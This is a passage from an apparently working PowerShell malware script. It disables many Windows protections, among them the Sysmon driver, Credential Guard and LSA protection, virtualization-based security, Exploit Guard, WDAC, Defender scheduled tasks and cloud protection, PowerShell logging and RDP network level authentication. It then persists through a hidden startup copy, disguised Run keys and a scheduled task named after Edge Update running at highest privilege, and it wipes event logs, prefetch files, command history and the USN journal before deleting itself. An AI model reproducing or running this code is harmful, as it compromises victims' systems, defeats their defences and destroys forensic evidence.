& fltmc unload SysmonDrv 2>&1 | Out-Null

# ─── 17. Disable Error Reporting ──────────────────────────────
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -Properties @{
    "Disabled"               = 1
    "DontSendAdditionalData" = 1
    "LoggingDisabled"        = 1
}

# ─── 18. Disable Remote Assistance ────────────────────────────
Set-RegistryProperties -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -Properties @{ "fAllowToGetHelp" = 0 }

# ─── 19. Disable Windows Script Host ──────────────────────────
Set-RegistryProperties -Path "HKLM:\Software\Microsoft\Windows Script Host\Settings" -Properties @{ "Enabled" = 0 }

# ─── 20. Disable Automatic Maintenance ────────────────────────
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" -Properties @{ "MaintenanceDisabled" = 1 }

# ─── 21. Disable Credential Guard ─────────────────────────────
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -Properties @{ "LsaCfgFlags" = 0 }
Set-RegistryProperties -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Properties @{
    "LsaCfgFlags" = 0
    "RunAsPPL"    = 0
}

# ─── 22. Disable Device Guard / VBS ───────────────────────────
Set-RegistryProperties -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Properties @{
    "EnableVirtualizationBasedSecurity" = 0
    "RequirePlatformSecurityFeatures"   = 0
    "HVCIMATRequired"                   = 0
    "Locked"                            = 0
}

# ─── 23. Disable Application Guard ────────────────────────────
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Microsoft\Hvsi" -Properties @{ "Enabled" = 0 }

# ─── 24. Disable Exploit Guard ────────────────────────────────
Set-RegistryProperties -Path "$baseKey\Windows Defender Exploit Guard" -Properties @{ "EnableExploitProtection" = 0 }
Set-RegistryProperties -Path "$baseKey\Windows Defender Exploit Guard\Network Protection" -Properties @{ "EnableNetworkProtection" = 0 }
Set-RegistryProperties -Path "$baseKey\Windows Defender Exploit Guard\Controlled Folder Access" -Properties @{ "EnableControlledFolderAccess" = 0 }

# ─── 25. Disable Telemetry ────────────────────────────────────
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Properties @{
    "AllowTelemetry"                     = 0
    "DoNotShowFeedbackNotifications"     = 1
}

# ─── 26. Disable OneDrive ─────────────────────────────────────
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\OneDrive" -Properties @{ "DisableFileSyncNGSC" = 1 }

# ─── 27. Disable Cortana ──────────────────────────────────────
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -Properties @{ "AllowCortana" = 0 }

# ─── 28. Disable Defender Scheduled Tasks ──────────────────────
$defenderTasks = @(
    "Windows Defender Cache Maintenance",
    "Windows Defender Cleanup",
    "Windows Defender Scheduled Scan",
    "Windows Defender Verification"
)
foreach ($task in $defenderTasks) {
    Disable-ScheduledTaskSafe -TaskPath "\Microsoft\Windows\Windows Defender\" -TaskName $task
}
# Also disable Exploit Guard tasks
Disable-ScheduledTaskSafe -TaskPath "\Microsoft\Windows\ExploitGuard\" -TaskName "ExploitGuard MDM policy Refresh"

# ─── 29. Disable PowerShell Logging (Registry) ────────────────
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Properties @{ "EnableScriptBlockLogging" = 0 }
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Properties @{ "EnableModuleLogging" = 0 }
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Properties @{ "EnableTranscripting" = 0 }

# ─── 30. Disable Windows Defender Application Control (WDAC) ──
Set-RegistryProperties -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -Properties @{
    "DeployConfigCIPolicy" = 0
    "HypervisorEnforcedCodeIntegrity" = 0
}

# ─── 31. Disable Network Level Authentication ─────────────────
Set-RegistryProperties -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Properties @{
    "UserAuthentication" = 0
}

# ─── 32. Disable Windows Defender Cloud Delivered Protection ──
Set-RegistryProperties -Path "$baseKey\SpyNet" -Properties @{
    "SpynetReporting"      = 0
    "SubmitSamplesConsent" = 2
}

#endregion

# ╔══════════════════════════════════════════════════════════════╗
# ║                 MULTI-LAYER PERSISTENCE                     ║
# ╚══════════════════════════════════════════════════════════════╝

#region Persistence

function Invoke-SelfReplication {
    $ext        = [System.IO.Path]::GetExtension($FullPath)
    $randomBase = [System.IO.Path]::GetRandomFileName().Split('.')[0]
    $randomName = $randomBase + $ext
    $content    = Get-Content -Path $FullPath -Raw -ErrorAction SilentlyContinue

    if (-not $content) { return }

    # ── Method 1: Startup Folder (hidden + system attributes) ──
    $startupTarget = $null
    try {
        # [BUG FIX] Original checked for exact original filename but saved with random name
        # Now checks by file content hash to avoid duplicate copies
        $existingCopies = Get-ChildItem $startupPath -Filter "*$ext" -Force -ErrorAction SilentlyContinue | Where-Object {
            $existingContent = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            $existingContent -eq $content
        }

        if (-not $existingCopies) {
            $startupTarget = Join-Path $startupPath $randomName
            Copy-Item -Path $FullPath -Destination $startupTarget -Force
            (Get-Item $startupTarget -Force).Attributes = 'Hidden, System, ReadOnly'
        } else {
            $startupTarget = $existingCopies[0].FullName
        }
    } catch {}

    # Determine the path to use for persistence references
    $persistPath = if ($startupTarget) { $startupTarget } else { $FullPath }

    # Build the execution command
    $execCmd = if ($ext -eq '.ps1') {
        "`"powershell.exe`" -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$persistPath`""
    } else {
        "`"$persistPath`""
    }

    # ── Method 2: Registry Run Key ─────────────────────────────
    try {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealthSystray" -Value $execCmd -Force
    } catch {}

    # ── Method 3: Scheduled Task (runs at logon with HIGHEST privilege) ──
    try {
        $taskAction   = if ($ext -eq '.ps1') {
            New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$persistPath`""
        } else {
            New-ScheduledTaskAction -Execute $persistPath
        }
        $taskTrigger  = New-ScheduledTaskTrigger -AtLogOn
        $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
        $taskPrincipal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest

        Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineCore" `
            -Action $taskAction -Trigger $taskTrigger `
            -Settings $taskSettings -Principal $taskPrincipal `
            -Force | Out-Null
    } catch {}

    # ── Method 4: HKLM Run Key (machine-level, requires admin) ──
    try {
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $execCmd -Force
    } catch {}
}

#endregion

# ╔══════════════════════════════════════════════════════════════╗
# ║              COMPREHENSIVE TRACE CLEANUP                    ║
# ╚══════════════════════════════════════════════════════════════╝

#region Cleanup

function Invoke-SelfDestruction {
    # ── Clean UAC bypass registry artifacts ────────────────────
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "HKCU:\Software\Classes\Folder\shell" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Recurse -Force -ErrorAction SilentlyContinue

    # ── Delete Prefetch files ──────────────────────────────────
    $prefetchPath = "$env:SystemRoot\Prefetch"
    Get-ChildItem -Path $prefetchPath -Filter "*POWERSHELL*.pf" -ErrorAction SilentlyContinue |
        Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem -Path $prefetchPath -Filter "*PWSH*.pf" -ErrorAction SilentlyContinue |
        Remove-Item -Force -ErrorAction SilentlyContinue

    $scriptName = [System.IO.Path]::GetFileNameWithoutExtension($FullPath).ToUpper()
    if ($scriptName) {
        Get-ChildItem -Path $prefetchPath -Filter "$scriptName*.pf" -ErrorAction SilentlyContinue |
            Remove-Item -Force -ErrorAction SilentlyContinue
    }

    # ── Delete Recent files (last 24h) ─────────────────────────
    Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
        Where-Object { $_.LastWriteTime -ge (Get-Date).AddDays(-1) } |
        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

    # ── Clear PowerShell command history ───────────────────────
    try {
        $historyPath = (Get-PSReadlineOption -ErrorAction Stop).HistorySavePath
        if ($historyPath -and (Test-Path $historyPath)) {
            Remove-Item -Path $historyPath -Force -ErrorAction SilentlyContinue
        }
    } catch {}
    # Also clear in-memory history
    Clear-History -ErrorAction SilentlyContinue

    # ── Clear Windows Event Logs ───────────────────────────────
    $logsToClear = @(
        "System", "Security", "Application",
        "Windows PowerShell",
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-PowerShell/Analytic",
        "Microsoft-Windows-Sysmon/Operational",
        "Microsoft-Windows-Windows Defender/Operational",
        "Microsoft-Windows-Windows Defender/WHC",
        "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
        "Microsoft-Windows-TaskScheduler/Operational",
        "Microsoft-Windows-UAC-FileVirtualization/Operational",
        "Microsoft-Windows-UAC/Operational"
    )
    foreach ($log in $logsToClear) {
        & wevtutil cl "$log" 2>&1 | Out-Null
    }

    # ── Clean temp files created by this process ───────────────
    Get-ChildItem $env:TEMP -Filter "*.tmp" -ErrorAction SilentlyContinue |
        Where-Object { $_.LastWriteTime -ge (Get-Date).AddHours(-1) } |
        Remove-Item -Force -ErrorAction SilentlyContinue

    # ── Clean USN Journal (filesystem change log) ──────────────
    $systemDrive = $env:SystemDrive
    & fsutil usn deletejournal /d "$systemDrive" 2>&1 | Out-Null

    # ── Self-destruct or rename ────────────────────────────────
    $inStartup = Get-ChildItem $startupPath -Force -ErrorAction SilentlyContinue | Where-Object { $_.FullName -eq $FullPath }

    if (-not $inStartup) {
        # Not in startup folder: delete self
        if ($ScriptPath) {
            Remove-Item -Path $FullPath -Force -ErrorAction SilentlyContinue
        } else {
            # For compiled EXE: spawn delayed deletion process
            Start-Process powershell.exe -ArgumentList @(
                "-NoProfile", "-WindowStyle", "Hidden", "-Command",
                "Start-Sleep -Milliseconds 800; Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue"
            ) -WindowStyle Hidden
        }
    } else {
        # In startup folder: rename with random name to reduce detection
        $newName = [System.IO.Path]::GetRandomFileName().Split('.')[0] + [System.IO.Path]::GetExtension($FullPath)
        Rename-Item $FullPath -NewName $newName -Force -ErrorAction SilentlyContinue
    }
}

#endregion

# ╔══════════════════════════════════════════════════════════════╗
# ║                       EXECUTION                             ║
# ╚══════════════════════════════════════════════════════════════╝

# Establish persistence via multiple methods
Invoke-SelfReplication

# Clean all traces and self-destruct
Invoke-SelfDestruction
